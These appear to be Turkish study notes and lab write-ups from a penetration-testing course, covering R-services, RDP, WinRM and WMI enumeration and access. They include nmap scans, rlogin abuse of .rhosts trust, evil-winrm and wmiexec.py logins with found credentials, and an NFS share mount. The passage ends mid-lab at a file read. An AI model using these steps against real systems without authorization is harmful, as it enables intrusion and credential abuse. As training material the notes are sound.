Bu örnekten de görebileceğimiz gibi, her iki dosya da <kullanıcı `adı>` `<ip adresi>` veya `<kullanıcı adı> <ana bilgisayar adı>` çiftlerinin özel sözdizimini takip eder. Ayrıca, `+` değiştiricisi bu dosyalar içinde herhangi bir şeyi belirtmek için joker karakter olarak kullanılabilir. Bu örnekte, `+` değiştiricisi herhangi bir harici kullanıcının `10.0.17.10` IP adresli ana bilgisayar aracılığıyla `htb-student` kullanıcı hesabından r-komutlarına erişmesine izin verir.  

Bu dosyalardan herhangi birindeki yanlış yapılandırmalar, bir saldırganın kimlik bilgileri olmadan başka bir kullanıcı olarak kimlik doğrulaması yapmasına ve kod yürütme elde etmesine olanak tanıyabilir. Artık bu dosyalardaki yanlış yapılandırmaları potansiyel olarak nasıl kötüye kullanabileceğimizi anladığımıza göre, `rlogin` kullanarak bir hedef hostta oturum açmayı deneyelim.

#### Logging in Using Rlogin

```shell-session
M1R4CKCK@htb[/htb]$ rlogin 10.0.17.2 -l htb-student

Last login: Fri Dec  2 16:11:21 from localhost

[htb-student@localhost ~]$
```

`.rhosts` dosyasındaki yanlış yapılandırmalar nedeniyle uzak hostta `htb-student` hesabı altında başarıyla oturum açtık. Başarılı bir şekilde oturum açtıktan sonra, 513 numaralı UDP portuna istek göndererek lokal ağdaki tüm interaktif oturumları listelemek için `rwho` komutunu da kötüye kullanabiliriz.

#### Listing Authenticated Users Using Rwho

```shell-session
M1R4CKCK@htb[/htb]$ rwho

root     web01:pts/0 Dec  2 21:34
htb-student     workstn01:tty1  Dec  2 19:57  2:25       
```

Bu bilgilerden, `htb-student` kullanıcısının şu anda `workstn01` hostunda kimlik doğrulamasının yapıldığını, `root` kullanıcısının ise `web01` hostunda kimlik doğrulamasının yapıldığını görebiliriz. Bunu, ağ üzerinden hostlara yapılacak diğer saldırılar sırasında kullanılacak potansiyel kullanıcı adlarını belirlerken avantajımıza kullanabiliriz. Bununla birlikte, `rwho` daemon oturum açmış kullanıcılar hakkında periyodik olarak bilgi yayınlar, bu nedenle ağ trafiğini izlemek faydalı olabilir.

#### **Rusers Kullanarak Kimliği Doğrulanmış Kullanıcıları Listeleme**  

`rwho` ile birlikte ek bilgi sağlamak için `rusers` komutunu verebiliriz. Bu bize, kullanıcı adı, erişilen makinenin host adı, kullanıcının oturum açtığı TTY, kullanıcının oturum açtığı tarih ve saat, kullanıcının klavyede yazmasından bu yana geçen süre ve oturum açtıkları uzak host (varsa) gibi bilgiler dahil olmak üzere ağ üzerinden oturum açmış tüm kullanıcıların daha ayrıntılı bir hesabını verecektir.

```shell-session
M1R4CKCK@htb[/htb]$ rusers -al 10.0.17.5

htb-student     10.0.17.5:console          Dec 2 19:57     2:25
```

Gördüğümüz gibi, R-hizmetleri doğalarında bulunan güvenlik kusurları ve SSH gibi daha güvenli protokollerin mevcudiyeti nedeniyle günümüzde daha az kullanılmaktadır. Çok yönlü bir bilgi güvenliği uzmanı olmak için birçok sistem, uygulama, protokol vb. hakkında geniş ve derin bir anlayışa sahip olmamız gerekir. Bu nedenle, R-hizmetleri hakkındaki bu bilgileri dosyalayın çünkü bunlarla ne zaman karşılaşacağınızı asla bilemezsiniz.

## **Son Düşünceler**  

Uzaktan yönetim hizmetleri bize bir veri hazinesi sağlayabilir ve genellikle zayıf/varsayılan kimlik bilgileri veya parolanın yeniden kullanımı yoluyla yetkisiz erişim için kötüye kullanılabilir. Bu hizmetleri her zaman toplayabildiğimiz kadar çok bilgi için araştırmalı ve özellikle hedef ağın başka yerlerinden kimlik bilgilerinin bir listesini derlediğimizde taş üstünde taş bırakmamalıyız.


# Windows Remote Management Protocols

Windows Server'lar, uzak sunuculardaki Server Manager yönetim görevleri kullanılarak lokal olarak yönetilebilir. Remote management, Windows Server 2016'dan itibaren varsayılan olarak etkinleştirilmiştir. Remote management, sunucu donanımını yerel olarak ve uzaktan yöneten Windows donanım yönetimi özelliklerinin bir bileşenidir. Bu özellikler arasında WS-Management protokolünü uygulayan bir hizmet, taban kartı yönetim denetleyicileri aracılığıyla donanım tanılama ve kontrolü ve WS-Management protokolü aracılığıyla uzaktan iletişim kuran uygulamalar yazmamızı sağlayan bir COM API ve komut dosyası nesneleri bulunur.

Windows ve Windows sunucularının uzaktan yönetimi için kullanılan ana bileşenler şunlardır:

- Remote Desktop Protocol (`RDP`)
    
- Windows Remote Management (`WinRM`)
    
- Windows Management Instrumentation (`WMI`)

## **RDP**  

[Uzak Masaüstü Protokolü](“https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol”) (`RDP`), Windows işletim sistemini çalıştıran bir bilgisayara uzaktan erişim için Microsoft tarafından geliştirilen bir protokoldür. Bu protokol, görüntüleme ve kontrol komutlarının IP ağları üzerinden şifrelenmiş GUI aracılığıyla iletilmesini sağlar. RDP, TCP/IP referans modelindeki uygulama katmanında çalışır ve genellikle aktarım protokolü olarak TCP port 3389'u kullanır. Ancak, bağlantısız UDP protokolü uzaktan yönetim için 3389 numaralı portu da kullanabilir.  

Bir RDP oturumunun kurulabilmesi için hem ağ güvenlik duvarının hem de sunucudaki güvenlik duvarının dışarıdan gelen bağlantılara izin vermesi gerekir. İnternet bağlantılarında sıklıkla olduğu gibi, istemci ve sunucu arasındaki rotada [Ağ Adresi Çevirisi](https://en.wikipedia.org/wiki/Network_address_translation) (N`AT`) kullanılıyorsa, uzak bilgisayarın sunucuya ulaşmak için genel IP adresine ihtiyacı vardır. Buna ek olarak, NAT yönlendiricisinde sunucu yönünde port yönlendirme ayarlanmalıdır.

RDP, Windows Vista'dan bu yana [Taşıma Katmanı Güvenliğini](https://en.wikipedia.org/wiki/Transport_Layer_Security) (`TLS/SSL`) kullanmaktadır, bu da tüm verilerin ve özellikle oturum açma işleminin ağda iyi şifreleme ile korunduğu anlamına gelir. Bununla birlikte, birçok Windows sistemi bu konuda ısrarcı olmamakla birlikte, [RDP Güvenliği](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322) aracılığıyla yetersiz şifrelemeyi kabul etmektedir. Bununla birlikte, bununla bile, kimlik sağlayan sertifikalar varsayılan olarak yalnızca kendinden imzalı olduğundan, bir saldırgan hala kilitlenmekten uzaktır. Bu, istemcinin gerçek bir sertifikayı sahte bir sertifikadan ayırt edemeyeceği ve kullanıcı için bir sertifika uyarısı oluşturacağı anlamına gelir.  

`Remote Desktop` hizmeti Windows sunucularında varsayılan olarak yüklüdür ve ek harici uygulamalar gerektirmez. Bu hizmet `Server Manager` kullanılarak etkinleştirilebilir ve yalnızca [Ağ düzeyinde kimlik doğrulaması](“https://en.wikipedia.org/wiki/Network_Level_Authentication”) (`NLA`) olan hostların hizmete bağlanmasına izin vermek için varsayılan ayarla birlikte gelir.


## **Footprinting the Service**  

RDP hizmetini taramak bize hızlı bir şekilde host hakkında birçok bilgi verebilir. Örneğin, sunucuda `NLA` 'nın etkin olup olmadığını, ürün sürümünü ve host adını belirleyebiliriz.

#### Nmap

```shell-session
M1R4CKCK@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```


Buna ek olarak, paketleri tek tek izlemek ve içeriklerini manuel olarak incelemek için `--packet-trace` kullanabiliriz. Nmap tarafından RDP sunucusuyla etkileşim kurmak için kullanılan RDP `cookie'lerinin` (`mstshash=nmap`) `tehdit avcıları` ve [Endpoint Detection and Response](“https://en.wikipedia.org/wiki/Endpoint_detection_and_response”) (`EDR`) gibi çeşitli güvenlik hizmetleri tarafından tespit edilebileceğini ve güçlendirilmiş ağlarda sızma testçileri olarak bizi dışarıda bırakabileceğini görebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET
SENT (0.2506s) ICMP [10.10.14.20 > 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]
SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 <mss 1460>
SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024
SENT (0.2517s) ICMP [10.10.14.20 > 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]
RCVD (0.2814s) ICMP [10.129.201.248 > 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]
SENT (0.3264s) TCP 10.10.14.20:55772 > 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 <mss 1460>
RCVD (0.3565s) TCP 10.129.201.248:3389 > 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 <mss 1357>
NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1)
NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8
NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389]
Service scan sending probe NULL to 10.129.201.248:3389 (tcp)
NSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389]
Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)
NSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389]
NSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389]
NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4.........
Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||

...SNIP...

NSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389]
NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69    *%      Cooki
00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap
00000020: 0d 0a 01 00 08 00 0b 00 00 00  

...SNIP...

NSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389]
NSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389]
NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | SEND
NSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74
NSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes)
NSE: TCP 10.10.14.20:36630 < 10.129.201.248:3389 | 
00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0          0  0
00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02        NTLMSSP
00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9        8   5
00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s              p
00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49  p L     cE    I
00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S
00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49  Q L - 0 1     I
00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S
000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49  Q L - 0 1     I
000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00  1
000000d0: 00 00 00

...SNIP...
```

[Cisco CX Security Labs](“https://github.com/CiscoCXSecurity”) tarafından el sıkışmalarına dayalı olarak RDP sunucularının güvenlik ayarlarını yetkisiz olarak belirleyebilen [rdp-sec-check.pl](“https://github.com/CiscoCXSecurity/rdp-sec-check”) adlı bir Perl betiği de geliştirilmiştir.

#### RDP Security Check - Installation

```shell-session
M1R4CKCK@htb[/htb]$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most of it can be done automatically.
If you answer 'no' below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure as much as possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote '/root/.cpan/CPAN/MyConfig.pm'

You can re-run configuration any time with 'o conf init' in the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2.27)
Enter 'h' for help.


cpan[1]> install Encoding::BER

Fetching with LWP:
http://www.cpan.org/authors/01mailrc.txt.gz
Reading '/root/.cpan/sources/authors/01mailrc.txt.gz'
............................................................................DONE
...SNIP...
```


#### RDP Security Check

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
M1R4CKCK@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248

Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021

[+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

[+] Checking supported protocols

[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Checking RDP Security Layer

[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

[+] Summary of protocol support

[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

[+] Summary of RDP encryption support

[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

[+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
```


Kimlik doğrulama ve bu tür RDP sunucularına bağlantı çeşitli şekillerde yapılabilir. Örneğin, Linux üzerindeki RDP sunucularına `xfreerdp`, `rdesktop` veya `Remmina` kullanarak bağlanabilir ve buna göre sunucunun GUI'si ile etkileşime girebiliriz.

#### **Bir RDP Oturumu Başlatın**

```shell-session
M1R4CKCK@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248

[16:37:47:135] [95319:95320] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[16:37:47:447] [95319:95320] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory /home/cry0l1t3/.config/freerdp
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory [/home/cry0l1t3/.config/freerdp/certs]
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - created directory [/home/cry0l1t3/.config/freerdp/server]
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - CN = ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.201.248:3389) 
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] -      ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.201.248:3389 (RDP-Server):
        Common Name: ILF-SQL-01
        Subject:     CN = ILF-SQL-01
        Issuer:      CN = ILF-SQL-01
        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.


Do you trust the above certificate? (Y/T/N) y

[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMajorVersion: 6
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMinorVersion: 1
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductBuild: 7601
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      Reserved: 0x000000
```

Başarılı kimlik doğrulamasından sonra, bağlandığımız sunucunun masaüstüne erişim sağlayan yeni bir pencere görünecektir.

## **WinRM**  

Windows Remote Management (`WinRM`), komut satırına dayalı basit bir Windows bütünleşik uzaktan yönetim protokolüdür. WinRM, uzak hostlara ve onların uygulamalarına bağlantı kurmak için Simple Object Access Protocol (`SOAP`) kullanır. Bu nedenle, WinRM'nin Windows 10'dan başlayarak açıkça etkinleştirilmesi ve yapılandırılması gerekir. WinRM iletişim için `TCP` portları `5985` ve `5986` 'ya dayanır, son port `5986` `HTTPS kullanır`, çünkü portlar 80 ve 443 daha önce bu görev için kullanılıyordu. Ancak, 80 numaralı port çoğunlukla güvenlik nedenleriyle engellendiğinden, günümüzde daha yeni olan 5985 ve 5986 numaralı portlar kullanılmaktadır.  

Yönetim için WinRM'ye uyan bir diğer bileşen, uzaktaki sistemde keyfi komutlar çalıştırmamızı sağlayan Windows Remote Shell'dir (`WinRS`). Program varsayılan olarak Windows 7'de bile bulunmaktadır. Böylece WinRM ile başka bir sunucuda uzak bir komut çalıştırmak mümkündür.  

PowerShell kullanan uzak oturumlar ve olay günlüğü birleştirme gibi hizmetler WinRM gerektirir. `Windows Server 2012` sürümünden itibaren varsayılan olarak etkinleştirilir, ancak önce eski sunucu sürümleri ve istemciler için yapılandırılması ve gerekli güvenlik duvarı istisnalarının oluşturulması gerekir.

## **Footprinting the Service**

Bildiğimiz gibi, WinRM varsayılan olarak Nmap kullanarak tarayabileceğimiz `5985` (`HTTP`) ve `5986` (`HTTPS`) TCP portlarını kullanır. Ancak, genellikle HTTPS (`TCP 5986`) yerine yalnızca HTTP (TCP`5985`) kullanıldığını görürüz.

#### Nmap WinRM

```shell-session
M1R4CKCK@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET
Nmap scan report for 10.129.201.248
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

Bir veya daha fazla uzak sunucuya WinRM aracılığıyla erişilip erişilemeyeceğini öğrenmek istiyorsak, bunu PowerShell yardımıyla kolayca yapabiliriz. Test-WsMan cmdlet'i bundan sorumludur ve söz konusu host'un adı ona iletilir. Linux tabanlı ortamlarda, WinRM ile etkileşim için tasarlanmış bir başka sızma testi aracı olan [evil-winrm](https://github.com/Hackplayers/evil-winrm) adlı aracı kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

## **WMI**  

Windows Management Instrumentation (`WMI`) Microsoft'un uygulaması ve aynı zamanda Windows platformu için standartlaştırılmış Web Tabanlı Kurumsal Yönetimin (`WBEM`) temel işlevselliği olan Ortak Bilgi Modelinin (`CIM`) bir uzantısıdır. WMI, Windows sistemlerindeki neredeyse tüm ayarlara okuma ve yazma erişimi sağlar. Anlaşılır bir şekilde, bu onu Windows ortamında, ister PC ister sunucu olsun, Windows bilgisayarların yönetimi ve uzaktan bakımı için en kritik arayüz haline getirmektedir. WMI'ya genellikle PowerShell, VBScript veya Windows Yönetim Araçları Konsolu (`WMIC`) aracılığıyla erişilir. WMI tek bir program değildir ancak birkaç programdan ve depo olarak da bilinen çeşitli veritabanlarından oluşur.

## **Footprinting the Service**

WMI iletişiminin başlatılması her zaman `TCP` port `135` üzerinde gerçekleşir ve bağlantının başarılı bir şekilde kurulmasından sonra iletişim rastgele bir porta taşınır. Örneğin, bunun için Impacket araç setindeki [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) programı kullanılabilir.

#### WMIexec.py

```shell-session
M1R4CKCK@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```

Yine belirtmek gerekir ki, bu hizmetleri kurarak ve kendi Windows Server VM'mizdeki yapılandırmalarla oynayarak deneyim kazanmak ve işlevsel ilkeyi ve yöneticinin bakış açısını geliştirmek için edinilen bilginin yerini kılavuzları okumak alamaz. Bu nedenle, kendi Windows Sunucunuzu kurmanızı, ayarları denemenizi ve sonuçlardaki farklılıkları görmek için bu hizmetleri tekrar tekrar taramanızı şiddetle tavsiye ederiz.


# Footprinting Lab - Easy
İlk sunucu, araştırılması gereken dahili bir DNS sunucusudur.

Ancak müşterimiz, bu hizmetler üretimde olduğu için açıkları kullanarak hizmetlere agresif bir şekilde saldırmanın yasak olduğunu açıkça belirtti.  

Ayrıca, ekip arkadaşlarımız aşağıdaki “ceil:qwer1234” kimlik bilgilerini buldular ve şirketin bazı çalışanlarının bir forumda SSH anahtarları hakkında konuştuklarına dikkat çektiler.

Yöneticiler, ilerlememizi izlemek ve başarıyı ölçmek için bu sunucuda bir `flag.txt` dosyası sakladılar. Hedefi tam olarak numaralandırın ve bu dosyanın içeriğini kanıt olarak gönderin.


![Pasted image 20241110160414.png](/img/user/resimler/Pasted%20image%2020241110160414.png)

![Pasted image 20241110160641.png](/img/user/resimler/Pasted%20image%2020241110160641.png)

![Pasted image 20241110161220.png](/img/user/resimler/Pasted%20image%2020241110161220.png)

![Pasted image 20241110161334.png](/img/user/resimler/Pasted%20image%2020241110161334.png)

![Pasted image 20241110161346.png](/img/user/resimler/Pasted%20image%2020241110161346.png)

Bulunan kimlik b ilgilerini 21 ve 2121 portlarına deneyelim .

![Pasted image 20241110163243.png](/img/user/resimler/Pasted%20image%2020241110163243.png)

![Pasted image 20241110163540.png](/img/user/resimler/Pasted%20image%2020241110163540.png)

Ve şimdi ssh private key'im var. 22 numaralı port açık olduğu için ssh servisine erişimim var (anahtara bazı izinler vermeyi****UNUTMAYIN**** ).

![Pasted image 20241110163702.png](/img/user/resimler/Pasted%20image%2020241110163702.png)

![Pasted image 20241110164255.png](/img/user/resimler/Pasted%20image%2020241110164255.png)


# Footprinting Lab - Medium
Bu ikinci sunucu, iç ağdaki herkesin erişebildiği bir sunucudur. Müşterimizle yaptığımız görüşmede, bu sunucuların genellikle saldırganlar için ana hedeflerden biri olduğunu ve bu sunucunun da kapsama eklenmesi gerektiğini belirttik.  

Müşterimiz bunu kabul etti ve bu sunucuyu kapsamımıza ekledi. Burada da amaç aynı kaldı. Bu sunucu hakkında mümkün olduğunca çok bilgi edinmemiz ve bunları sunucunun kendisine karşı kullanmanın yollarını bulmamız gerekiyor. Müşteri verilerinin kanıtlanması ve korunması için `HTB` adında bir kullanıcı oluşturuldu. Buna göre, bu kullanıcının kimlik bilgilerini kanıt olarak elde etmemiz gerekiyor.

Soru : Sunucuyu dikkatlice numaralandırın ve “HTB” kullanıcı adını ve şifresini bulun. Ardından, bu kullanıcının şifresini cevap olarak gönderin.
Cevap : 

Sunucuyu dikkatlice numaralandırın ve “HTB” kullanıcı adını ve şifresini bulun. Daha sonra, bu kullanıcının şifresini cevap olarak gönderin. (****İPUCU****: SQL Management Studio'da, seçilen veritabanının son 200 girişini düzenleyebilir ve girişleri buna göre okuyabiliriz. Ayrıca her Windows sisteminin bir Administrator hesabı olduğunu da unutmamalıyız).

![Pasted image 20241110165435.png](/img/user/resimler/Pasted%20image%2020241110165435.png)
![Pasted image 20241110165442.png](/img/user/resimler/Pasted%20image%2020241110165442.png)


![Pasted image 20241110165718.png](/img/user/resimler/Pasted%20image%2020241110165718.png)
![Pasted image 20241110165920.png](/img/user/resimler/Pasted%20image%2020241110165920.png)

![Pasted image 20241110165932.png](/img/user/resimler/Pasted%20image%2020241110165932.png)

![Pasted image 20241110165951.png](/img/user/resimler/Pasted%20image%2020241110165951.png)

![Pasted image 20241110165959.png](/img/user/resimler/Pasted%20image%2020241110165959.png)

Burada birkaç port açık ancak büyük resme bakarsanız birkaç servisin kullanıldığını görebilirsiniz: RPC, SMB, NFS. Ben NFS ile başladım. Bu komutu kullanarak hangi paylaşımların mevcut olduğunu öğrenebilirim:

![Pasted image 20241110170039.png](/img/user/resimler/Pasted%20image%2020241110170039.png)

/TechSupport adında bir paylaşım vardı  

Bu paylaşımı bağlamak için öncelikle bir dizin oluşturdum: mkdir NFS

Ve sonra bu komutu kullanarak paylaşımı bağladım :

![Pasted image 20241110170157.png](/img/user/resimler/Pasted%20image%2020241110170157.png)

Dizine root kullanıcısı ile erişebilirsiniz.

![Pasted image 20241110170232.png](/img/user/resimler/Pasted%20image%2020241110170232.png)

Gördüğünüz gibi çok sayıda .txt dosyası var. Birçoğu boş olduğu için hepsini bir kerede okumaya çalıştım))


```shell-session
cat ticket4238791283*
Conversation with InlaneFreight Ltd

